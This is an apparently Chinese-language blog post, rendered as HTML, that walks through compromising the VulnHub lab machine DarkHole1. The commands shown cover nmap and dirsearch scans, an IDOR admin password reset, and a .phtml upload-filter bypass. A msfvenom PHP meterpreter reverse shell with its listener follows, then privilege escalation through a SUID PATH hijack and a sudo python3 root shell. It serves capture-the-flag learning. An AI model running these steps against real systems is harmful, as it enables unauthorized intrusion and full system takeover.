@@ -1,0 +1,367 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="/images/icons/favicon/favicon-16x16.png?v=2.8.0" type="image/png" sizes="16x16"><link rel="icon" href="/images/icons/favicon/favicon-32x32.png?v=2.8.0" type="image/png" sizes="32x32"><link rel="apple-touch-icon" href="/images/icons/favicon/apple-touch-icon.png?v=2.8.0" sizes="180x180"><meta name="description" content="前言       靶场地址： https:&#x2F;&#x2F;www.vulnhub.com&#x2F;entry&#x2F;darkhole-1,724&#x2F;                     信息收集                           端口扫描        ifconfig查到kali的ip为192.168.10.10 扫描该网段下面的在线设备,确认靶场IP为192.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DarkHole1">
+<meta property="og:url" content="https://www.ixxzhi.cn/2024/04/13/DarkHole1/index.html">
+<meta property="og:site_name" content="冰糖の部落阁">
+<meta property="og:description" content="前言       靶场地址： https:&#x2F;&#x2F;www.vulnhub.com&#x2F;entry&#x2F;darkhole-1,724&#x2F;                     信息收集                           端口扫描        ifconfig查到kali的ip为192.168.10.10 扫描该网段下面的在线设备,确认靶场IP为192.">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://qn.hackfox.cn/2024/image-20240904234313656.png">
+<meta property="og:image" content="http://qn.hackfox.cn/2024/image-20240904234621592.png">
+<meta property="og:image" content="http://qn.hackfox.cn/2024/image-20240904234943468.png">
+<meta property="og:image" content="http://qn.hackfox.cn/2024/image-20240904235118255.png">
+<meta property="og:image" content="http://qn.hackfox.cn/2024/image-20240905001208556.png">
+<meta property="og:image" content="http://qn.hackfox.cn/2024/image-20240905010138474.png">
+<meta property="og:image" content="http://qn.hackfox.cn/2024/image-20240905010210340.png">
+<meta property="og:image" content="http://qn.hackfox.cn/2024/image-20240905010500260.png">
+<meta property="og:image" content="http://qn.hackfox.cn/2024/image-20240905011105898.png">
+<meta property="og:image" content="http://qn.hackfox.cn/2024/image-20240905011209671.png">
+<meta property="og:image" content="http://qn.hackfox.cn/2024/image-20240905011742555.png">
+<meta property="og:image" content="http://qn.hackfox.cn/2024/image-20240905011835805.png">
+<meta property="og:image" content="http://qn.hackfox.cn/2024/image-20240905012115483.png">
+<meta property="og:image" content="http://qn.hackfox.cn/2024/image-20240905012455083.png">
+<meta property="og:image" content="http://qn.hackfox.cn/2024/image-20240905013226417.png">
+<meta property="og:image" content="http://qn.hackfox.cn/2024/image-20240905013321258.png">
+<meta property="og:image" content="http://qn.hackfox.cn/2024/image-20240905013351460.png">
+<meta property="og:image" content="http://qn.hackfox.cn/2024/image-20240905013716636.png">
+<meta property="og:image" content="http://qn.hackfox.cn/2024/image-20240905013956757.png">
+<meta property="og:image" content="http://qn.hackfox.cn/2024/image-20240905014315920.png">
+<meta property="og:image" content="http://qn.hackfox.cn/2024/image-20240905014410224.png">
+<meta property="og:image" content="http://qn.hackfox.cn/2024/image-20240905015038876.png">
+<meta property="og:image" content="http://qn.hackfox.cn/2024/image-20240905015244485.png">
+<meta property="og:image" content="http://qn.hackfox.cn/2024/image-20240905015503960.png">
+<meta property="og:image" content="http://qn.hackfox.cn/2024/image-20240905020005767.png">
+<meta property="article:published_time" content="2024-04-12T16:43:22.000Z">
+<meta property="article:modified_time" content="2024-09-04T18:00:55.179Z">
+<meta property="article:author" content="冰糖小混子">
+<meta property="article:tag" content="Vulnhub靶场">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://qn.hackfox.cn/2024/image-20240904234313656.png"><title>DarkHole1 | 冰糖の部落阁</title><link ref="canonical" href="https://www.ixxzhi.cn/2024/04/13/DarkHole1/"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/instantsearch.js@2.1.1/dist/instantsearch.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.8.0"><link rel="stylesheet" href="css/custom.css"><script>var Stun = window.Stun || {};
+var CONFIG = {
+  root: '/',
+  algolia: {"appId":"AKOK4JB6FU","apiKey":"afe2853f80920ee4cdb1d45209c0ecf2","indexName":"blog_ixxzhi","hits":{"per_page":10},"languages":{"inputPlaceholder":"搜索文章","hitsEmpty":"没有找到任何搜索结果：${query}","hitsStats":"找到 ${hits} 条搜索结果，耗时 ${time} 毫秒"}},
+  assistSearch: undefined,
+  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
+  sidebar: {"offsetTop":"20px","tocMaxDepth":6},
+  header: {"enable":true,"showOnPost":true,"scrollDownIcon":false},
+  postWidget: {"endText":true},
+  nightMode: {"enable":true},
+  back2top: {"enable":true},
+  codeblock: {"style":"default","highlight":"light","wordWrap":false},
+  reward: false,
+  fancybox: false,
+  zoomImage: {"gapAside":"20px"},
+  galleryWaterfall: undefined,
+  lazyload: false,
+  pjax: undefined,
+  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
+  shortcuts: undefined,
+  prompt: {"copyButton":"复制","copySuccess":"复制成功","copyError":"复制失败"},
+  sourcePath: {"js":"js","css":"css","images":"images"},
+};
+
+window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 6.3.0"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">首页</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">归档</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/categories/"><span class="header-nav-menu-item__icon"><i class="fas fa-layer-group"></i></span><span class="header-nav-menu-item__text">分类</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/tags/"><span class="header-nav-menu-item__icon"><i class="fas fa-tags"></i></span><span class="header-nav-menu-item__text">标签</span></a></div></div><div class="header-nav-search"><span class="header-nav-search__icon"><i class="fas fa-search"></i></span><span class="header-nav-search__text">搜索</span></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">冰糖の部落阁</div><div class="header-banner-info__subtitle">冰糖的笔记和随笔</div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content" id="content"><!-- Just used to judge whether it is an article page--><div id="is-post"></div><div class="post"><header class="post-header"><h1 class="post-title">DarkHole1</h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2024-04-13</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2024-09-05</span></span></div></header><div class="post-body">
+        <h1 id="前言"   >
+          <a href="#前言" class="heading-link"><i class="fas fa-link"></i></a><a href="#前言" class="headerlink" title="前言"></a>前言</h1>
+      <p>靶场地址：</p>
+<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/darkhole-1,724/" >https://www.vulnhub.com/entry/darkhole-1,724/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+
+        <h1 id="信息收集"   >
+          <a href="#信息收集" class="heading-link"><i class="fas fa-link"></i></a><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1>
+      
+        <h2 id="端口扫描"   >
+          <a href="#端口扫描" class="heading-link"><i class="fas fa-link"></i></a><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2>
+      <blockquote>
+<p>ifconfig查到kali的ip为<strong>192.168.10.10</strong></p>
+<p>扫描该网段下面的在线设备,确认靶场IP为<strong>192.168.10.11</strong>，开放的端口有<strong>22、80</strong></p>
+</blockquote>
+<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -Pn 192.168.10.0/24</span><br></pre></td></tr></table></div></figure>
+
+<p><img src="http://qn.hackfox.cn/2024/image-20240904234313656.png" alt="image-20240904234313656"></p>
+<p>浏览器访问192.168.10.11结果如下：</p>
+<p><img src="http://qn.hackfox.cn/2024/image-20240904234621592.png" alt="image-20240904234621592"></p>
+
+        <h2 id="目录扫描"   >
+          <a href="#目录扫描" class="heading-link"><i class="fas fa-link"></i></a><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h2>
+      <p>使用dirsearch扫描网站目录发现以下目录</p>
+<figure class="highlight shell"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u 192.168.10.11:80</span><br></pre></td></tr></table></div></figure>
+
+<p><img src="http://qn.hackfox.cn/2024/image-20240904234943468.png" alt="image-20240904234943468"></p>
+
+        <h1 id="渗透测试"   >
+          <a href="#渗透测试" class="heading-link"><i class="fas fa-link"></i></a><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h1>
+      
+        <h2 id="注册账号"   >
+          <a href="#注册账号" class="heading-link"><i class="fas fa-link"></i></a><a href="#注册账号" class="headerlink" title="注册账号"></a>注册账号</h2>
+      <p>访问登录页面发现可以注册账号</p>
+<p><img src="http://qn.hackfox.cn/2024/image-20240904235118255.png" alt="image-20240904235118255"></p>
+
+        <h2 id="登录网站"   >
+          <a href="#登录网站" class="heading-link"><i class="fas fa-link"></i></a><a href="#登录网站" class="headerlink" title="登录网站"></a>登录网站</h2>
+      <p>登录后的页面有两个功能：</p>
+<ul>
+<li>修改个人信息</li>
+<li>修改密码</li>
+</ul>
+<p>看此时的URL的话可以看到get参数id&#x3D;2,由此可以推测或许存在id为1的用户</p>
+<p><img src="http://qn.hackfox.cn/2024/image-20240905001208556.png" alt="image-20240905001208556"></p>
+
+        <h2 id="越权"   >
+          <a href="#越权" class="heading-link"><i class="fas fa-link"></i></a><a href="#越权" class="headerlink" title="越权"></a>越权</h2>
+      <p>Burpsuite拦截修改密码的包</p>
+<p><img src="http://qn.hackfox.cn/2024/image-20240905010138474.png" alt="image-20240905010138474"></p>
+<p>放包后返回密码已修改</p>
+<p><img src="http://qn.hackfox.cn/2024/image-20240905010210340.png" alt="image-20240905010210340"></p>
+<p>此处推测id&#x3D;1的账号为admin,而我们在上一步已经将id&#x3D;1的账号密码修改为admin,所以我们使用admin&#x2F;admin尝试登录</p>
+<p><img src="http://qn.hackfox.cn/2024/image-20240905010500260.png" alt="image-20240905010500260"></p>
+
+        <h2 id="上传php文件"   >
+          <a href="#上传php文件" class="heading-link"><i class="fas fa-link"></i></a><a href="#上传php文件" class="headerlink" title="上传php文件"></a>上传php文件</h2>
+      <p>可以看到成功登录后管理员账户新增一个文件上传功能，由于该网站由php编写，所以尝试上传php文件</p>
+<p>此处为了方便，新建了一个php文件，内容为phpinfo,假设上传的文件可以正常被解析的话，下一步就可以上传php的木马了</p>
+<p><img src="http://qn.hackfox.cn/2024/image-20240905011105898.png" alt="image-20240905011105898"></p>
+<p>上传过程种发现上传点会根据后缀名进行过滤，无法直接上传php文件。所以只能使用一些冷门的后缀名。</p>
+<p><img src="http://qn.hackfox.cn/2024/image-20240905011209671.png" alt="image-20240905011209671"></p>
+<p>此处经过多次尝试后发现.phtml可以正常上传并解析</p>
+<p><img src="http://qn.hackfox.cn/2024/image-20240905011742555.png" alt="image-20240905011742555"></p>
+<p>访问后被成功解析成php文件</p>
+<p><img src="http://qn.hackfox.cn/2024/image-20240905011835805.png" alt="image-20240905011835805"></p>
+
+        <h2 id="getshell"   >
+          <a href="#getshell" class="heading-link"><i class="fas fa-link"></i></a><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2>
+      
+        <h2 id="msf制作php木马"   >
+          <a href="#msf制作php木马" class="heading-link"><i class="fas fa-link"></i></a><a href="#msf制作php木马" class="headerlink" title="msf制作php木马"></a>msf制作php木马</h2>
+      <p>使用msf生成一个php木马文件<code>msf_php.phtml</code></p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.10.11 lport=4444 -o msf_php.phtml</span><br></pre></td></tr></table></div></figure>
+
+<p><img src="http://qn.hackfox.cn/2024/image-20240905012115483.png" alt="image-20240905012115483"></p>
+
+        <h2 id="上传木马"   >
+          <a href="#上传木马" class="heading-link"><i class="fas fa-link"></i></a><a href="#上传木马" class="headerlink" title="上传木马"></a>上传木马</h2>
+      <p>使用上述方法上传到后台，返回的路径为upload&#x2F;msf_php.phtml</p>
+<p><img src="http://qn.hackfox.cn/2024/image-20240905012455083.png" alt="image-20240905012455083"></p>
+
+        <h2 id="kali开启msf监听"   >
+          <a href="#kali开启msf监听" class="heading-link"><i class="fas fa-link"></i></a><a href="#kali开启msf监听" class="headerlink" title="kali开启msf监听"></a>kali开启msf监听</h2>
+      <p>开启msf监听</p>
+<figure class="highlight shell"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">打开msf控制台</span></span><br><span class="line">msfconsole</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">使用攻击模块</span></span><br><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">设置参数</span></span><br><span class="line">set lhost 192.168.10.11</span><br><span class="line">set lport 4444</span><br><span class="line">set payload php/meterpreter/reverse_tcp</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">启动</span></span><br><span class="line">run</span><br></pre></td></tr></table></div></figure>
+
+<p><img src="http://qn.hackfox.cn/2024/image-20240905013226417.png" alt="image-20240905013226417"></p>
+<p>此时使用浏览器访问php木马</p>
+<p><img src="http://qn.hackfox.cn/2024/image-20240905013321258.png" alt="image-20240905013321258"></p>
+<p>此时php木马已回连到kali的msf</p>
+<p><img src="http://qn.hackfox.cn/2024/image-20240905013351460.png" alt="image-20240905013351460"></p>
+<p>进入shell并生成一个交互式的shell</p>
+<figure class="highlight shell"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br><span class="line">python3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;);&#x27;</span><br></pre></td></tr></table></div></figure>
+
+<p><img src="http://qn.hackfox.cn/2024/image-20240905013716636.png" alt="image-20240905013716636"></p>
+
+        <h1 id="提权"   >
+          <a href="#提权" class="heading-link"><i class="fas fa-link"></i></a><a href="#提权" class="headerlink" title="提权"></a>提权</h1>
+      <p>查看敏感文件后发现有三个账户,分别为root、darkhole和john</p>
+<figure class="highlight shell"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/passwd | grep /bin/bash</span><br></pre></td></tr></table></div></figure>
+
+<p><img src="http://qn.hackfox.cn/2024/image-20240905013956757.png" alt="image-20240905013956757"></p>
+<p>从home目录查找具有SUID权限的文件发现&#x2F;home&#x2F;john&#x2F;toto文件具有SUID权限</p>
+<figure class="highlight shell"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find /home -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></div></figure>
+
+<p><img src="http://qn.hackfox.cn/2024/image-20240905014315920.png" alt="image-20240905014315920"></p>
+<p>运行toto文件发现其作用是输出id</p>
+<p><img src="http://qn.hackfox.cn/2024/image-20240905014410224.png" alt="image-20240905014410224"></p>
+<p>由此推测，toto文件可能调用id命令，我们可以尝试通过修改环境变量，让toto在执行id命令时打开一个john的shell</p>
+<figure class="highlight shell"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;/bin/bash&quot; &gt; /tmp/id</span><br><span class="line">chmod 777 /tmp/id</span><br><span class="line">export PATH=/tmp:$PATH</span><br><span class="line">/home/john/toto</span><br></pre></td></tr></table></div></figure>
+
+<p><img src="http://qn.hackfox.cn/2024/image-20240905015038876.png" alt="image-20240905015038858"></p>
+<p>成功拿到john的shell,进入john的家目录发现存在password文件，此文件说明了<strong>john</strong>用户的密码为<strong>root123</strong></p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /home/john</span><br><span class="line">cat password</span><br></pre></td></tr></table></div></figure>
+
+<p><img src="http://qn.hackfox.cn/2024/image-20240905015244485.png" alt="image-20240905015244485"></p>
+<p>查看john用户权限（此处需要john密码）</p>
+<figure class="highlight shell"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></div></figure>
+
+<p>发现john可以使用root权限执行&#x2F;usr&#x2F;bin&#x2F;python3 &#x2F;home&#x2F;john&#x2F;file.py这个命令</p>
+<p><img src="http://qn.hackfox.cn/2024/image-20240905015503960.png" alt="image-20240905015503960"></p>
+<p>利用file.py打开一个root权限的shell</p>
+<figure class="highlight shell"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;);&#x27; &gt; file.py</span><br><span class="line">sudo /usr/bin/python3 /home/john/file.py</span><br></pre></td></tr></table></div></figure>
+
+<p><img src="http://qn.hackfox.cn/2024/image-20240905020005767.png" alt="image-20240905020005767"></p>
+<p>成功拿到root权限！！！</p>
+</div><footer class="post-footer"><div class="post-ending ending"><div class="ending__text">------ 本文结束，感谢您的阅读 ------</div></div><div class="post-copyright copyright"><div class="copyright-author"><span class="copyright-author__name">本文作者: </span><span class="copyright-author__value"><a href="https://www.ixxzhi.cn">冰糖小混子</a></span></div><div class="copyright-link"><span class="copyright-link__name">本文链接: </span><span class="copyright-link__value"><a href="https://www.ixxzhi.cn/2024/04/13/DarkHole1/">https://www.ixxzhi.cn/2024/04/13/DarkHole1/</a></span></div><div class="copyright-notice"><span class="copyright-notice__name">版权声明: </span><span class="copyright-notice__value">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" rel="external nofollow" target="_blank">BY-NC-SA</a> 许可协议。转载请注明出处！</span></div></div><div class="post-tags"><span class="post-tags-item"><span class="post-tags-item__icon"><i class="fas fa-tag"></i></span><a class="post-tags-item__link" href="https://www.ixxzhi.cn/tags/Vulnhub%E9%9D%B6%E5%9C%BA/">Vulnhub靶场</a></span></div><nav class="post-paginator paginator"><div class="paginator-prev"><a class="paginator-prev__link" href="/2024/05/10/Java%E9%A2%84%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/"><span class="paginator-prev__icon"><i class="fas fa-angle-left"></i></span><span class="paginator-prev__text">Java预编译原理</span></a></div><div class="paginator-next"><a class="paginator-next__link" href="/2024/04/10/JIS-CTF-VulnUpload%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/"><span class="paginator-prev__text">JIS-CTF: VulnUpload靶场实战</span><span class="paginator-next__icon"><i class="fas fa-angle-right"></i></span></a></div></nav></footer></div></div><div class="comments" id="comments"><div id="utterances-container"></div></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><div class="sidebar-nav"><span class="sidebar-nav-toc current">文章目录</span><span class="sidebar-nav-ov">站点概览</span></div><section class="sidebar-toc"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">
+          前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">2.</span> <span class="toc-text">
+          信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">2.1.</span> <span class="toc-text">
+          端口扫描</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F"><span class="toc-number">2.2.</span> <span class="toc-text">
+          目录扫描</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95"><span class="toc-number">3.</span> <span class="toc-text">
+          渗透测试</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%A8%E5%86%8C%E8%B4%A6%E5%8F%B7"><span class="toc-number">3.1.</span> <span class="toc-text">
+          注册账号</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%99%BB%E5%BD%95%E7%BD%91%E7%AB%99"><span class="toc-number">3.2.</span> <span class="toc-text">
+          登录网站</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B6%8A%E6%9D%83"><span class="toc-number">3.3.</span> <span class="toc-text">
+          越权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%8A%E4%BC%A0php%E6%96%87%E4%BB%B6"><span class="toc-number">3.4.</span> <span class="toc-text">
+          上传php文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#getshell"><span class="toc-number">3.5.</span> <span class="toc-text">
+          getshell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#msf%E5%88%B6%E4%BD%9Cphp%E6%9C%A8%E9%A9%AC"><span class="toc-number">3.6.</span> <span class="toc-text">
+          msf制作php木马</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%8A%E4%BC%A0%E6%9C%A8%E9%A9%AC"><span class="toc-number">3.7.</span> <span class="toc-text">
+          上传木马</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#kali%E5%BC%80%E5%90%AFmsf%E7%9B%91%E5%90%AC"><span class="toc-number">3.8.</span> <span class="toc-text">
+          kali开启msf监听</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">4.</span> <span class="toc-text">
+          提权</span></a></li></ol></section><!-- ov = overview--><section class="sidebar-ov hide"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="/images/icons/avatar.jpg" alt="avatar"></div><p class="sidebar-ov-author__text">冰糖小混子</p></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">37</div><div class="sidebar-ov-state-item__name">归档</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--categories" href="/categories/"><div class="sidebar-ov-state-item__count">9</div><div class="sidebar-ov-state-item__name">分类</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--tags" href="/tags/"><div class="sidebar-ov-state-item__count">27</div><div class="sidebar-ov-state-item__name">标签</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="知识共享许可协议" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section><div class="sidebar-reading"><div class="sidebar-reading-info"><span class="sidebar-reading-info__text">你已阅读了 </span><span class="sidebar-reading-info__num">0</span><span class="sidebar-reading-info__perc">%</span></div><div class="sidebar-reading-line"></div></div></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2024</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>冰糖小混子</span><span class="footer__devider">|</span><span><a href="https://beian.miit.gov.cn/" rel="noopener" target="_blank">蒙ICP备20002846号</a></span></div><div><span>由 <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a> 强力驱动</span><span> v6.3.0</span><span class="footer__devider">|</span><span>主题 - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.8.0</span></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><div class="search-mask"></div><div class="search-popup"><span class="search-close"></span><div class="search-input"></div><div class="search-results"><div id="algolia-hits"></div></div><div id="algolia-pagination"></div><div id="algolia-stats"></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script src="https://cdn.jsdelivr.net/npm/ribbon.js@latest/dist/ribbon.min.js" size="120" alpha="0.6" zIndex="-1"></script><script src="https://cdn.jsdelivr.net/npm/instantsearch.js@2.1.1/dist/instantsearch.min.js" defer></script><script>window.addEventListener('DOMContentLoaded', function () {
+  $('.header-nav-search').on('click', function (e) {
+    e.stopPropagation();
+
+    $('body').css('overflow', 'hidden');
+    $('.search-popup')
+      .velocity('stop')
+      .velocity('transition.expandIn', {
+        duration: 300,
+        complete: function () {
+          $('.search-popup input').focus();
+        }
+      });
+    $('.search-mask')
+      .velocity('stop')
+      .velocity('transition.fadeIn', {
+        duration: 300
+      });
+  });
+
+  function closeSearch () {
+    $('body').css({ overflow: 'auto' });
+    $('.search-popup').css({ display: 'none' });
+    $('.search-mask').css({ display: 'none' });
+  }
+
+  $('.search-mask, .search-close').on('click', function () {
+    closeSearch();
+  });
+
+  $(document).on('keydown', function (e) {
+    // Escape <=> 27
+    if (e.keyCode === Stun.utils.codeToKeyCode('Escape')) {
+      closeSearch();
+    }
+  });
+
+  var algolia = CONFIG.algolia;
+  if (!algolia && !(algolia.appId && algolia.apiKey && algolia.indexName)) {
+    return console.error('Algolia setting is invalid.');
+  }
+
+  var search = instantsearch({
+    appId: algolia.appId,
+    apiKey: algolia.apiKey,
+    indexName: algolia.indexName,
+    searchParameters: {
+      hitsPerPage: algolia.hits.per_page || 10
+    },
+    searchFunction: function (helper) {
+      var searchInput = $('.search-input').find('input');
+
+      if (searchInput.val()) {
+        helper.search();
+      }
+    }
+  });
+
+  search.addWidget(
+    instantsearch.widgets.searchBox({
+      container: '.search-input',
+      reset: false,
+      magnifier: false,
+      placeholder: algolia.languages.inputPlaceholder
+    })
+  );
+
+  // The hits of search results.
+  search.addWidget(
+    instantsearch.widgets.hits({
+      container: '#algolia-hits',
+      templates: {
+        item: function (data) {
+          var link = data.permalink ? data.permalink : CONFIG.root + data.path;
+          return (
+            '<a href="' + link + '" class="algolia-hit-item-link">' +
+              data._highlightResult.title.value +
+            '</a>'
+          );
+        },
+        empty: function (data) {
+          return (
+            '<div id="algolia-hits-empty">' +
+              algolia.languages.hitsEmpty.replace(/\$\{query}/, data.query) +
+            '</div>'
+          );
+        }
+      },
+      cssClasses: {
+        item: 'algolia-hit-item'
+      }
+    })
+  );
+
+  // The stats of search results.
+  if ($('#algolia-stats')[0]) {
+    search.addWidget(
+      instantsearch.widgets.stats({
+        container: '#algolia-stats',
+        templates: {
+          body: function (data) {
+            var stats = algolia.languages.hitsStats
+              .replace(/\$\{hits}/, data.nbHits)
+              .replace(/\$\{time}/, data.processingTimeMS);
+            return (
+              stats +
+              '<span class="algolia-logo pull-right">' +
+                '<img src="' + CONFIG.root +
+                `${CONFIG.sourcePath.images}/algolia.svg" alt="Algolia" />` +
+              '</span>'
+            );
+          }
+        }
+      })
+    );
+  }
+
+  // The pagination of the results.
+  search.addWidget(
+    instantsearch.widgets.pagination({
+      container: '#algolia-pagination',
+      scrollTo: false,
+      showFirstLast: false,
+      labels: {
+        first: '<i class="fa fa-angle-double-left"></i>',
+        last: '<i class="fa fa-angle-double-right"></i>',
+        previous: '<i class="fa fa-angle-left"></i>',
+        next: '<i class="fa fa-angle-right"></i>'
+      },
+      cssClasses: {
+        root: 'pagination',
+        item: 'pagination-item',
+        link: 'page-number',
+        active: 'current',
+        disabled: 'disabled-item'
+      }
+    })
+  );
+
+  search.start();
+});</script><script>function loadUtterances() {
+  var d = document, s = d.createElement('script');
+  var container = d.getElementById('utterances-container');
+
+  if (!container) {
+    return;
+  }
+  s.src = 'https://utteranc.es/client.js';
+  s.setAttribute('repo', 'ixxzhi/ixxzhi.github.io');
+  s.setAttribute('issue-term', 'title');
+  s.setAttribute('label', 'utterances');
+  s.setAttribute('theme', 'github-light');
+  s.setAttribute('crossorigin', 'anonymous');
